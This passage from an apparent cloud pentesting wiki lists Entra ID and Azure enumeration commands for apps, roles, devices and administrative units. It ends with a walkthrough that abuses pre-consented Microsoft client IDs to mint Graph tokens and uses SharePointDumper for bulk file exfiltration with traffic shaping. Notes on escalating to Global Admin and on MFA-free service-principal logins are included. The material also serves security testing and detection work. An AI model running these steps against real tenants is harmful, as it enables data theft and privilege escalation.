# Az - Entra ID (AzureAD) - Enumeration (Continued)

## e.g.
[
  {
    "resourceAccess": [
      {
        "id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d",
        "type": "Scope"
      },
      {
        "id": "d07a8cc0-3d51-4b77-b3b0-32704d1f69fa",
        "type": "Role"
      }
    ],
    "resourceAppId": "00000003-0000-0000-c000-000000000000"
  }
]

## For the perms of type "Scope"
az ad sp show --id <ResourceAppId> --query "oauth2PermissionScopes[?id=='<id>'].value" -o tsv
az ad sp show --id "00000003-0000-0000-c000-000000000000" --query "oauth2PermissionScopes[?id=='e1fe6dd8-ba31-4d61-89e7-88639da4683d'].value" -o tsv

## For the perms of type "Role"
az ad sp show --id <ResourceAppId> --query "appRoles[?id=='<id>'].value" -o tsv
az ad sp show --id 00000003-0000-0000-c000-000000000000 --query "appRoles[?id=='d07a8cc0-3d51-4b77-b3b0-32704d1f69fa'].value" -o tsv
```

<details>
<summary>Find all applications API permissions and mark Microsoft-owned APIs (az cli)</summary>

```bash
#!/usr/bin/env bash
set -euo pipefail

# Known Microsoft first-party owner organization IDs.
MICROSOFT_OWNER_ORG_IDS=(
  "f8cdef31-a31e-4b4a-93e4-5f571e91255a"
  "72f988bf-86f1-41af-91ab-2d7cd011db47"
)

is_microsoft_owner() {
  local owner="$1"
  local id
  for id in "${MICROSOFT_OWNER_ORG_IDS[@]}"; do
    if [ "$owner" = "$id" ]; then
      return 0
    fi
  done
  return 1
}

get_permission_value() {
  local resource_app_id="$1"
  local perm_type="$2"
  local perm_id="$3"
  local key value
  key="${resource_app_id}|${perm_type}|${perm_id}"

  value="$(awk -F '\t' -v k="$key" '$1==k {print $2; exit}' "$tmp_perm_cache")"
  if [ -n "$value" ]; then
    printf '%s\n' "$value"
    return 0
  fi

  if [ "$perm_type" = "Scope" ]; then
    value="$(az ad sp show --id "$resource_app_id" --query "oauth2PermissionScopes[?id=='$perm_id'].value | [0]" -o tsv 2>/dev/null || true)"
  elif [ "$perm_type" = "Role" ]; then
    value="$(az ad sp show --id "$resource_app_id" --query "appRoles[?id=='$perm_id'].value | [0]" -o tsv 2>/dev/null || true)"
  else
    value=""
  fi

  [ -n "$value" ] || value="UNKNOWN"
  printf '%s\t%s\n' "$key" "$value" >> "$tmp_perm_cache"
  printf '%s\n' "$value"
}

command -v az >/dev/null 2>&1 || { echo "az CLI not found" >&2; exit 1; }
command -v jq >/dev/null 2>&1 || { echo "jq not found" >&2; exit 1; }
az account show >/dev/null

apps_json="$(az ad app list --all --query '[?length(requiredResourceAccess) > `0`].[displayName,appId,requiredResourceAccess]' -o json)"

tmp_map="$(mktemp)"
tmp_ids="$(mktemp)"
tmp_perm_cache="$(mktemp)"
trap 'rm -f "$tmp_map" "$tmp_ids" "$tmp_perm_cache"' EXIT

# Build unique resourceAppId values used by applications.
jq -r '.[][2][]?.resourceAppId' <<<"$apps_json" | sort -u > "$tmp_ids"

# Resolve resourceAppId -> owner organization + API display name.
while IFS= read -r rid; do
  [ -n "$rid" ] || continue
  sp_json="$(az ad sp show --id "$rid" --query '{owner:appOwnerOrganizationId,name:displayName}' -o json 2>/dev/null || true)"
  owner="$(jq -r '.owner // "UNKNOWN"' <<<"$sp_json")"
  name="$(jq -r '.name // "UNKNOWN"' <<<"$sp_json")"
  printf '%s\t%s\t%s\n' "$rid" "$owner" "$name" >> "$tmp_map"
done < "$tmp_ids"

echo -e "appDisplayName\tappId\tresourceApiDisplayName\tresourceAppId\tisMicrosoft\tpermissions"

# Print all app API permissions and mark if the target API is Microsoft-owned.
while IFS= read -r row; do
  app_name="$(jq -r '.[0]' <<<"$row")"
  app_id="$(jq -r '.[1]' <<<"$row")"

  while IFS= read -r rra; do
    resource_app_id="$(jq -r '.resourceAppId' <<<"$rra")"
    map_line="$(awk -F '\t' -v id="$resource_app_id" '$1==id {print; exit}' "$tmp_map")"
    owner_org="$(awk -F'\t' '{print $2}' <<<"$map_line")"
    resource_name="$(awk -F'\t' '{print $3}' <<<"$map_line")"

    [ -n "$owner_org" ] || owner_org="UNKNOWN"
    [ -n "$resource_name" ] || resource_name="UNKNOWN"

    if is_microsoft_owner "$owner_org"; then
      is_ms="true"
    else
      is_ms="false"
    fi

    permissions_csv=""
    while IFS= read -r access; do
      perm_type="$(jq -r '.type' <<<"$access")"
      perm_id="$(jq -r '.id' <<<"$access")"
      perm_value="$(get_permission_value "$resource_app_id" "$perm_type" "$perm_id")"
      perm_label="${perm_type}:${perm_value}"
      if [ -z "$permissions_csv" ]; then
        permissions_csv="$perm_label"
      else
        permissions_csv="${permissions_csv},${perm_label}"
      fi
    done < <(jq -c '.resourceAccess[]' <<<"$rra")

    echo -e "${app_name}\t${app_id}\t${resource_name}\t${resource_app_id}\t${is_ms}\t${permissions_csv}"
  done < <(jq -c '.[2][]' <<<"$row")
done < <(jq -c '.[]' <<<"$apps_json")
```

</details>

{{#endtab }}

{{#tab name="Az" }}

```bash
# Get Apps
Get-AzADApplication
# Get details of one App
Get-AzADApplication -ObjectId <id>
# Get App searching by string
Get-AzADApplication | ?{$_.DisplayName -match "app"}
# Get Apps with password
Get-AzADAppCredential
```

{{#endtab }}

{{#tab name="MS Graph" }}

```bash
# List Applications using Microsoft Graph PowerShell
Get-MgApplication -All

# Get application details
Get-MgApplication -ApplicationId 7861f72f-ad49-4f8c-96a9-19e6950cffe1 | Format-List *

# Search App by display name
Get-MgApplication -Filter "startswith(displayName, 'app')" | Select-Object DisplayName

# Get owner of an application
Get-MgApplicationOwner -ApplicationId <ApplicationId>

# List available commands in Microsoft Graph PowerShell
Get-Command -Module Microsoft.Graph.Applications
```
{{#endtab }}

{{#tab name="Azure AD" }}

```bash
# List all registered applications
Get-AzureADApplication -All $true
# Get details of an application
Get-AzureADApplication -ObjectId <id>  | fl *
# List all the apps with an application password
Get-AzureADApplication -All $true | %{if(Get-AzureADApplicationPasswordCredential -ObjectID $_.ObjectID){$_}}
# Get owner of an application
Get-AzureADApplication -ObjectId <id> | Get-AzureADApplicationOwner |fl *
```

{{#endtab }}
{{#endtabs }}

> [!WARNING]
> An app with the permission **`AppRoleAssignment.ReadWrite`** can **escalate to Global Admin** by grating itself the role.\
> For more information [**check this**](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48).

> [!NOTE]
> A secret string that the application uses to prove its identity when requesting a token is the application password.\
> So, if find this **password** you can access as the **service principal** **inside** the **tenant**.\
> Note that this password is only visible when generated (you could change it but you cannot get it again).\
> The **owner** of the **application** can **add a password** to it (so he can impersonate it).\
> Logins as these service principals are **not marked as risky** and they **won't have MFA.**

It's possible to find a list of commonly used App IDs that belongs to Microsoft in [https://learn.microsoft.com/en-us/troubleshoot/entra/entra-id/governance/verify-first-party-apps-sign-in#application-ids-of-commonly-used-microsoft-applications](https://learn.microsoft.com/en-us/troubleshoot/entra/entra-id/governance/verify-first-party-apps-sign-in#application-ids-of-commonly-used-microsoft-applications)

### Managed Identities

For more information about Managed Identities check:

{{#tabs }}
{{#tab name="az cli" }}

```bash
# List all manged identities
az identity list --output table
# With the principal ID you can continue the enumeration in service principals
```

{{#endtab }}
{{#endtabs }}

### Azure Roles

For more information about Azure roles check:

{{#tabs }}
{{#tab name="az cli" }}

```bash
# Get roles
az role definition list
# Get all assigned roles
az role assignment list --all --query "[].roleDefinitionName"
az role assignment list --all | jq '.[] | .roleDefinitionName,.scope'
# Get info of 1 role
az role definition list --name "AzureML Registry User"
# Get only custom roles
az role definition list --custom-role-only
# Get only roles assigned to the resource group indicated
az role definition list --resource-group <resource_group>
# Get only roles assigned to the indicated scope
az role definition list --scope <scope>
# Get all the principals a role is assigned to
az role assignment list --all --query "[].{principalName:principalName,principalType:principalType,scope:scope,roleDefinitionName:roleDefinitionName}[?roleDefinitionName=='<ROLE_NAME>']"
# Get all the roles assigned to a user
az role assignment list --assignee "<email>" --all --output table
# Get all the roles assigned to a user by filtering
az role assignment list --all --query "[?principalName=='admin@organizationadmin.onmicrosoft.com']" --output table
# Get deny assignments
az rest --method GET --uri "https://management.azure.com/{scope}/providers/Microsoft.Authorization/denyAssignments?api-version=2022-04-01"
## Example scope of subscription
az rest --method GET --uri "https://management.azure.com/subscriptions/9291ff6e-6afb-430e-82a4-6f04b2d05c7f/providers/Microsoft.Authorization/denyAssignments?api-version=2022-04-01"
```

{{#endtab }}

{{#tab name="MS Graph" }}

```bash

# List all available role templates using Microsoft Graph PowerShell
Get-MgDirectoryRoleTemplate -All

# List enabled built-in Entra ID roles
Get-MgDirectoryRole -All

# List all Entra ID roles with their permissions (including custom roles)
Get-MgDirectoryRoleDefinition -All

# List members of a Entra ID role
Get-MgDirectoryRoleMember -DirectoryRoleId <RoleId> -All

# List available commands in Microsoft Graph PowerShell
Get-Command -Module Microsoft.Graph.Identity.DirectoryManagement
```
{{#endtab }}

{{#tab name="Az" }}

```bash
# Get role assignments on the subscription
Get-AzRoleDefinition
# Get Role definition
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
# Get roles of a user or resource
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com
Get-AzRoleAssignment -Scope /subscriptions/<subscription-id>/resourceGroups/<res_group_name>/providers/Microsoft.Compute/virtualMachines/<vm_name>
# Get deny assignments
Get-AzDenyAssignment # Get from current subscription
Get-AzDenyAssignment -Scope '/subscriptions/96231a05-34ce-4eb4-aa6a-70759cbb5e83/resourcegroups/testRG/providers/Microsoft.Web/sites/site1'
```

{{#tab name="Raw" }}

```bash
# Get permissions over a resource using ARM directly
$Token = (Get-AzAccessToken).Token
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value
```

{{#endtab }}
{{#endtabs }}

### Entra ID Roles

For more information about Azure roles check:

{{#tabs }}
{{#tab name="az cli" }}

```bash
# List template Entra ID roles
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/directoryRoleTemplates"

# List enabled built-in Entra ID roles
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/directoryRoles"

# List all Entra ID roles with their permissions (including custom roles)
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions"

# List only custom Entra ID roles
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" | jq '.value[] | select(.isBuiltIn == false)'

# List all assigned Entra ID roles
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments"

# List members of a Entra ID roles
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/directoryRoles/<role-id>/members"

# List Entra ID roles assigned to a user
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/users/<user-id>/memberOf/microsoft.graph.directoryRole" \
  --query "value[]" \
  --output json

# List Entra ID roles assigned to a group
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/groups/$GROUP_ID/memberOf/microsoft.graph.directoryRole" \
  --query "value[]" \
  --output json

# List Entra ID roles assigned to a service principal
az rest --method GET \
  --uri "https://graph.microsoft.com/v1.0/servicePrincipals/$SP_ID/memberOf/microsoft.graph.directoryRole" \
  --query "value[]" \
  --output json
```

{{#endtab }}

{{#tab name="Azure AD" }}

```bash
# Get all available role templates
Get-AzureADDirectoryroleTemplate
# Get enabled roles (Assigned roles)
Get-AzureADDirectoryRole
Get-AzureADDirectoryRole -ObjectId <roleID> #Get info about the role
# Get custom roles - use AzureAdPreview
Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
# Users assigned a role (Global Administrator)
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
Get-AzureADDirectoryRole -ObjectId <id> | fl
# Roles of the Administrative Unit (who has permissions over the administrative unit and its members)
Get-AzureADMSScopedRoleMembership -Id <id> | fl *
```

{{#endtab }}
{{#endtabs }}

### Devices

{{#tabs }}
{{#tab name="az cli" }}

```bash
# If you know how to do this send a PR!
```

{{#endtab }}
{{#tab name="MS Graph" }}

```bash
# Enumerate devices using Microsoft Graph PowerShell
Get-MgDevice -All

# Get device details
Get-MgDevice -DeviceId <DeviceId> | Format-List *

# Get devices managed using Intune
Get-MgDevice -Filter "isCompliant eq true" -All

# Get devices owned by a user
Get-MgUserOwnedDevice -UserId test@corp.onmicrosoft.com

# List available commands in Microsoft Graph PowerShell
Get-Command -Module Microsoft.Graph.Identity.DirectoryManagement
```
{{#endtab }}

{{#tab name="Azure AD" }}

```bash
# Enumerate Devices
Get-AzureADDevice -All $true | fl *
# List all the active devices (and not the stale devices)
Get-AzureADDevice -All $true | ?{$_.ApproximateLastLogonTimeStamp -ne $null}
# Get owners of all devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredOwner -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
# Registred users of all the devices
Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredUser -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
# Get dives managed using Intune
Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"}
# Get devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Get Administrative Units of a device
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -ObjectId $_.ObjectId | where {$_.ObjectId -eq $deviceObjId} }
```

{{#endtab }}
{{#endtabs }}

> [!WARNING]
> If a device (VM) is **AzureAD joined**, users from AzureAD are going to be **able to login**.\
> Moreover, if the logged user is **Owner** of the device, he is going to be **local admin**.

### Administrative Units

For more information about administrative units check:

{{#tabs }}
{{#tab name="az cli" }}

```bash
# List all administrative units
az rest --method GET --uri "https://graph.microsoft.com/v1.0/directory/administrativeUnits"
# Get AU info
az rest --method GET --uri "https://graph.microsoft.com/v1.0/directory/administrativeUnits/a76fd255-3e5e-405b-811b-da85c715ff53"
# Get members
az rest --method GET --uri "https://graph.microsoft.com/v1.0/directory/administrativeUnits/a76fd255-3e5e-405b-811b-da85c715ff53/members"
# Get principals with roles over the AU
az rest --method GET --uri "https://graph.microsoft.com/v1.0/directory/administrativeUnits/a76fd255-3e5e-405b-811b-da85c715ff53/scopedRoleMembers"
```

{{#endtab }}

{{#tab name="AzureAD" }}

```bash
# Get Administrative Units
Get-AzureADMSAdministrativeUnit
Get-AzureADMSAdministrativeUnit -Id <id>
# Get ID of admin unit by string
$adminUnitObj = Get-AzureADMSAdministrativeUnit -Filter "displayname eq 'Test administrative unit 2'"
# List the users, groups, and devices affected by the administrative unit
Get-AzureADMSAdministrativeUnitMember -Id <id>
# Get the roles users have over the members of the AU
Get-AzureADMSScopedRoleMembership -Id <id> | fl #Get role ID and role members
```

{{#endtab }}
{{#endtabs }}

## Microsoft Graph delegated SharePoint data exfiltration (SharePointDumper)

Attackers with a **delegated Microsoft Graph token** that includes **`Sites.Read.All`** or **`Sites.ReadWrite.All`** can enumerate **sites/drives/items** over Graph and then **pull file contents** via **SharePoint pre-authentication download URLs** (time-limited URLs embedding an access token). The [SharePointDumper](https://github.com/zh54321/SharePointDumper) script automates the full flow (enumeration → pre-auth downloads) and emits per-request telemetry for detection testing.

### Obtaining usable delegated tokens

- SharePointDumper itself **does not authenticate**; supply an access token (optionally refresh token).
- Pre-consented **first-party clients** can be abused to mint a Graph token without registering an app. Example `Invoke-Auth` (from [EntraTokenAid](https://github.com/zh54321/EntraTokenAid)) invocations:

```powershell
# CAE requested by default; yields long-lived (~24h) access token
Import-Module ./EntraTokenAid/EntraTokenAid.psm1
$tokens = Invoke-Auth -ClientID 'b26aadf8-566f-4478-926f-589f601d9c74' -RedirectUrl 'urn:ietf:wg:oauth:2.0:oob'  # OneDrive (FOCI TRUE)

# Other pre-consented clients
Invoke-Auth -ClientID '1fec8e78-bce4-4aaf-ab1b-5451cc387264' -RedirectUrl 'https://login.microsoftonline.com/common/oauth2/nativeclient'              # Teams (FOCI TRUE)
Invoke-Auth -ClientID 'd326c1ce-6cc6-4de2-bebc-4591e5e13ef0' -RedirectUrl 'msauth://code/ms-sharepoint-auth%3A%2F%2Fcom.microsoft.sharepoint'        # SharePoint (FOCI TRUE)
Invoke-Auth -ClientID '4765445b-32c6-49b0-83e6-1d93765276ca' -RedirectUrl 'https://scuprodprv.www.microsoft365.com/spalanding' -Origin 'https://doesnotmatter' # OfficeHome (FOCI FALSE)
Invoke-Auth -ClientID '08e18876-6177-487e-b8b5-cf950c1e598c' -RedirectUrl 'https://onedrive.cloud.microsoft/_forms/spfxsinglesignon.aspx' -Origin 'https://doesnotmatter' # SPO Web Extensibility (FOCI FALSE)
```

> [!NOTE]
> FOCI TRUE clients support refresh across devices; FOCI FALSE clients often require `-Origin` to satisfy reply URL origin validation.

### Running SharePointDumper for enumeration + exfiltration

- Basic dump with custom UA / proxy / throttling:

```powershell
.\Invoke-SharePointDumper.ps1 -AccessToken $tokens.access_token -UserAgent "Not SharePointDumper" -RequestDelaySeconds 2 -Variation 3 -Proxy 'http://127.0.0.1:8080'
```

- Scope control: include/exclude sites or extensions and global caps:

```powershell
.\Invoke-SharePointDumper.ps1 -AccessToken $tokens.access_token -IncludeSites 'Finance','Projects' -IncludeExtensions pdf,docx -MaxFiles 500 -MaxTotalSizeMB 100
```

- **Resume** interrupted runs (re-enumerates but skips downloaded items):

```powershell
.\Invoke-SharePointDumper.ps1 -AccessToken $tokens.access_token -Resume -OutputFolder .\20251121_1551_MyTenant
```

- **Automatic token refresh on HTTP 401** (requires EntraTokenAid loaded):

```powershell
Import-Module ./EntraTokenAid/EntraTokenAid.psm1
.\Invoke-SharePointDumper.ps1 -AccessToken $tokens.access_token -RefreshToken $tokens.refresh_token -RefreshClientId 'b26aadf8-566f-4478-926f-589f601d9c74'
```

Operational notes:

- Prefers **CAE-enabled** tokens to avoid mid-run expiry; refresh attempts are **not** logged in the tool’s API log.
- Generates **CSV/JSON request logs** for **Graph + SharePoint** and redacts embedded SharePoint download tokens by default (toggleable).
- Supports **custom User-Agent**, **HTTP proxy**, **per-request delay + jitter**, and **Ctrl+C-safe shutdown** for traffic shaping during detection/IR tests.
